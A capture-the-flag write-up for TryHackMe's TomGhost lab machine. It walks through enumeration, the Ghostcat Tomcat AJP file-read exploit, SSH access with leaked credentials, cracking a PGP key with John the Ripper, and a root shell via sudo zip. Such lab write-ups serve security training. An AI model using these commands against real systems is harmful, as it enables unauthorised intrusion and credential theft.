TomGhost is a vulnerable machine that falls under the easy category of TryHackMe's boot to root machines.
It is about exploiting the "Ghostcat" vulnerability (CVE-2020-1938) in Apache Tomcat to get initial access and perform a horizontal privilege escalation to eventually fully compromise the machine and pwn the box

## **Enumeration**
***
### **Scanning**

* As always, let's deploy the machine and perform an Nmap Scan to scan for open ports :
```bash
root@kali# nmap -sC -sV -T4 -oN Tomghost_Scan <MACHINE_IP>
Nmap scan report for <MACHINE_IP>
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (reset)

|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* **As you can see, we have 4 open ports :**
   * There is an ```SSH``` service running on its default port ```22```
   * We have an ```Apache Tomcat 9.0.30``` running on ```8080``` and an ```Apache Jserv``` running on ```8009```
   * And there is a ```DNS``` service running on port ```53```

### **Web Services Enumeration**
* **Let's start off by enumerating the web services :**
<br/>
→ Visiting the following url ```http://<MACHINE_IP>:8080```, we are presented with the Apache Tomcat default page :
→ The obvious thing to do next is to run gobuster or any directory bruteforcing tool to see if there are some hidden directories :
```bash
root@kali# gobuster dir -u http://<MACHINE_IP>:8080/ -w /usr/share/wordlists/dirb/common.txt -t 4

```
→ Unfortunately, none of these discovered directories will help us compromise the machine.
<br/>
→ But, since we know the ```version``` of the ```Apache Tomcat``` we are dealing with, which is ```9.0.30```, we can look for any known vulnerabilities or exploits that would help us get initial access to the machine.
<br/>
→ After some searches, i figured that this version is vulnerable and it enables the attacker to read files on the server and allows ```remote code execution``` in some circumstances
<br/>
→ The problem lies in the implementation of the ```AJP protocol/connector```, which is enabled by default on Apache Tomcat and listens on port 8009, which is open as per Nmap
<br/>
→ This connection is treated with more trust than an HTTP connection, allowing an attacker to exploit it to perform actions that are not intended for an untrusted user.

## **Exploitation**
***
→ With that being said, let's search for an exploit against ```The AJP Connector``` using ```searchsploit``` : 
```console
root@kali# searchsploit AJP
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                    | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                    | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)      | multiple/webapps/49039.rb
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
→ Here, i'm going to use the Non-Metasploit version :
```console
root@kali# python3 /usr/share/exploitdb/exploits/multiple/webapps/48143.py     
usage: 48143.py [-h] [-p PORT] [-f FILE] target
48143.py: error: the following arguments are required: target
```
→ As you can see, the exploit only requires us to add the target as an argument
<br/>
→ The problem is that when i ran it, i came accross some errors which forced me to make some troubleshooting in order for the exploit to run as intended.

> *You can find the modified version in my Gihub repository <a href="https://github.com/YounesTasra-R4z3rSw0rd/CVE-2020-1938/blob/main/GhostCat_Exploit.py" target="_blank"><er>here</er></a>*

→ After running the exploit, i noticed some misplaced credentials :
```console
root@kali# python3 GhostCat_Exploit.py <MACHINE_IP>

## **Initial Access**
***
* Since SSH is open, we can use this credentials to login as ```skyfuck``` :

```console
root@kali# ssh skyfuck@<MACHINE_IP>
The authenticity of host '<MACHINE_IP> (<MACHINE_IP>)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<MACHINE_IP>' (ED25519) to the list of known hosts.

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

skyfuck@ubuntu:~$ 
```

* Since our first task is to find ```user.txt``` file, let's search for it using ```find``` command and ```cat``` it out :
```console
skyfuck@ubuntu:~$ find / -type f -name user.txt 2>/dev/null
/home/merlin/user.txt
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{REDACTED}
```
<br/>

## **Horizontal Privilege Escalation**
***
### **PGP Decryption**

* By enumerating skyfuck's ```HOME directory```, i found some interesting files :
```console
skyfuck@ubuntu:~$ ls -l
total 12
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

* It seems that we have a ```PGP encrypted file``` which might contain some credentials, and an ```ASC file``` which is a Transport armor file for PGP.
* The best way to ```decrypt``` this pgp file is by using ```JohnTheRipper```.
* In order to do so, let's open up an ```http server``` on port ```9999``` in the target machine and ```wget``` those files on our local machine.
    * Target Machine :
    ```console
       skyfuck@ubuntu:~$ python3 -m http.server 9999
       Serving HTTP on 0.0.0.0 port 9999 ...
       <Tun0 IP ADDRESS> - - [21/Aug/2022 10:34:19] "GET /tryhackme.asc HTTP/1.1" 200 -
       <Tun0 IP ADDRESS> - - [21/Aug/2022 10:34:44] "GET /credential.pgp HTTP/1.1" 200 -
    ```

    * Local Machine : 
    ```console
    root@kali# wget http://<MACHINE_IP>:9999/credential.pgp && wget http://<MACHINE_IP>:9999/tryhackme.asc
    --2022-08-21 13:39:45--  http://<MACHINE_IP>:9999/credential.pgp

    ```

> ***You can use ```Secure Copy scp``` as an alternative way to transfer those files to your local machine.***
```console
root@kali# scp skyfuck@<MACHINE_IP>:/home/skyfuck/* .
skyfuck@<MACHINE_IP>'s password: 
credential.pgp                                                       100%  394     1.8KB/s   00:00    
tryhackme.asc                                                        100% 5144    21.6KB/s   00:00  
```

* I am going to use ```gpg2john```, an embedded tool within ```John The Ripper```, which going to convert ```tryhackme.asc``` file to a hash :
```console
root@kail# gpg2john tryhackme.asc > Hash.txt                                                      
File tryhackme.asc
root@kali# cat Hash.txt
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd28af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

* At this stage, we can use ```john``` to crack the Hash : 
```console
root@kali# john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt Hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])

Session completed. 
```                                                                                                       

* Let's now decrypt ```credential.pgp``` file by entering the ```passphrase``` JohnTheRipper cracked for us.
    * First, we need to ```import``` the ```tryhackme.gpg``` file into gpg :
    ```console
root@kali# gpg --import tryhackme.asc               
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
    ```
    * We can now decrypt the ```credential.pgp``` file using the cracked ```passphrase``` :
    ```console
root@kali# gpg --decrypt credential.pgp             
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:[REDACTED]  
    ```
* It looks like we have the ```credentials``` of the ```merlin``` user.
* Let's switch over to ```merlin``` and see if we can find any vector that will help us escalate our privileges.


## **Vertical Privilege Escalation**
***
* Let's start by running ```sudo -l``` command to see what binaries can our user run with root privileges :
```console
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

* Great ! Our user can run ```/usr/bin/zip``` binary with ```root privileges``` and we are going to leverage this binary to escalate our privileges.
* The best way to do so, is by refering to <a href="https://gtfobins.github.io/gtfobins/zip/#sudo" target="_blank"><er>GTFOBins</er></a>
* By running those commands, you should expect a ```root shell``` :
```console
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
root@ubuntu# whoami
root
root@ubuntu# cat /root/root.txt
THM{REDACTED}
```
